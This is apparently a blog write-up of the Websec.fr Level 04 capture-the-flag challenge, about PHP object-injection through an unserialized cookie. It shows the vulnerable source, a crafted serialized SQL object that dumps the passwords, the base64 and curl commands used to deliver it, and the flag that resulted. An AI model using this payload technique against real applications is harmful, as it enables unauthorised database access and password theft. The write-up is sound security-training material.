+++
title = 'Websec.fr Level 04'
date = '2025-12-10T00:00:00+01:00'
draft = false
tags = ['websec', 'insecure-deserialization']
+++
![alt text](</images/stc/websec-level4.png>)
For LevelFour challenge we have two sources [here](http://websec.fr/level04/source1.php) and [here](http://websec.fr/level04/source2.php)

Only php code was displayed here because  `html` is not important.

**source1.php**

```php
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64
    _decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
?>

```

**source2.php**

```php
 <?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
?>

```

The `source2.php` help to connect to to database (`database.db`) and contains all functions who execute, recept query,
and the `source1.php` file contains a part who receive user input and send request using a function in `source2.php`.  
The function who take our attention is `__destruct()` function who is know to be a special magic function who is called when an object is  destroyed.  
It also know to conduct to insecure deserialization.

So firstly it's important to know in the code what is doing , how it work.

![alt text](/images/stc/enter-level4.png)

- It check if input is a integer firstly and display after the username associate at this `id`
- When we connected on websec.fr a cookie was created, her name is `leet_hax0r` and your ip address is checked before  left you to use the app.

```bash
$ curl -c - http://websec.fr/level04/index.php
	.....

websec.fr	FALSE	/level04/	FALSE	1768011574	leet_hax0r	YToxOntzOjI6ImlwIjtzOjE1OiIxMzcuMjU1LjEyNy4xMjkiO30%3D
```

the `YToxOntzOjI6ImlwIjtzOjE1OiIxMzcuMjU1LjEyNy4xMjkiO30%3D` is encoded to **base64**, after decoding we have

```bash
a:1:{s:2:"ip";s:15:"137.255.127.129";}
```
this is the format of serialized data, let's break down it.

![alt text](/images/stc/notation.png)


We have an **ip address** in deserialized data and it checked here : 
```php
if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
```
so we can if we want bypass this check like this : 
![alt text](/images/stc/bypass.png)

Now about a term used in image : 
- **SQL** `Object` was choosen because `__destruct()` method
in **SQL class** use  the variable `$query` to build the **SQL**
query. By change this value in serialized data the Attacker
can force the app to run a arbitrary SQL query .
- `conn` represent database **connexion** and `N` is her value
because by setting it have a `NULL` value .

I personnaly write a **serialized data** using the default serialized data given by app :

`a:2:{s:2:"ip";s:15:"137.255.127.129";s:7:"exploit";O:3:"SQL":1:{s:5:"query";s:39:"SELECT password AS username FROM users;";s:4:"conn";N;}}`

but for bypass the check of **ip address** like show in previous image we can use this :

`O:3:"SQL":1:{s:5:"query";s:39:"SELECT password AS username FROM users;";s:4:"conn";N;}`

So let's go for exploitation:  


```bash
tedsig42@exegol:~# echo -n 'a:2:{s:2:"ip";s:15:"137.255.127.129";s:7:"exploit";O:3:"SQL":1:{s:5:"query";s:39:"SELECT password AS username FROM users;";s:4:"conn";N;}}' | base64

YToyOntzOjI6ImlwIjtzOjE1OiIxMzcuMjU1LjEyNy4xMjkiO3M6NzoiZXhwbG9pdCI7TzozOiJT
UUwiOjE6e3M6NToicXVlcnkiO3M6Mzk6IlNFTEVDVCBwYXNzd29yZCBBUyB1c2VybmFtZSBGUk9N
IHVzZXJzOyI7czo0OiJjb25uIjtOO319

tedsig42@exegol:~$ curl -k https://websec.fr/level04/index.php -H "Cookie: leet_hax0r=YToyOntzOjI6ImlwIjtzOjE1OiIxMzcuMjU1LjEyNy4xMjkiO3M6NzoiZXhwbG9pdCI7TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzk6IlNFTEVDVCBwYXNzd29yZCBBUyB1c2VybmFtZSBGUk9NIHVzZXJzOyI7czo0OiJjb25uIjtOO319"

<p class="well"><strong>Username:<strong> WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</p>
<!DOCTYPE html>
<html>
.................
</html>
```
and we got the flag.  

**Flag** : `WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`

The final image exploitation was here :

![alt text](/images/stc/Serialized_data221last.png)